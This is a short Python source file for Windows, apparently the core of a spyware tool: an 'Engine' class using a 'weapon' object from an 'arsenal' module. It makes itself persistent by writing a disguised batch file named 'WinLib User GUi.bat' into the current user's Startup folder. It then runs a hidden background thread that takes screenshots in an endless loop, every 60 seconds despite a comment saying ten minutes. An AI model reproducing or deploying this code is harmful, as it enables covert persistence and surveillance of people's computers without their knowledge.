import os
import sys
import git
import subprocess
import arsenal
import winreg
import time
import threading


class Engine:
	def __init__(self):
		self.weapon = arsenal.Arsenal()
		...


	def bootController(self):
		# ADD DETECTER (OPTIONAL)
		script_name = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
		shell_script = f'start {script_name}'
		local_username = subprocess.run('whoami', shell = True, stdout = subprocess.PIPE).stdout.decode().split("\\")[1]
		local_username = local_username.replace('\n', '').replace('\r', '')

		absolute_path = f'C:/Users/{local_username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'

		if os.path.exists(absolute_path+'/WinLib User GUi.bat'):
			print('Bootloader exists')
			return


		with open(f'{absolute_path}/WinLib User GUi.bat', 'w') as boot_file:
			boot_file.write(shell_script)


	def taskScheduler(self, task_code = 0):
		if task_code == 0: # Default code; Take screenshot every 10min
			screenshot_thread = threading.Thread(target = self.screenshotTask, daemon = True)
			screenshot_thread.start()


	def screenshotTask(self):
		while True:
			self.weapon.takeShot()
			time.sleep(60)


if __name__ == '__main__' and os.name == 'nt':
	engine = Engine()
	engine.bootController()
	engine.taskScheduler()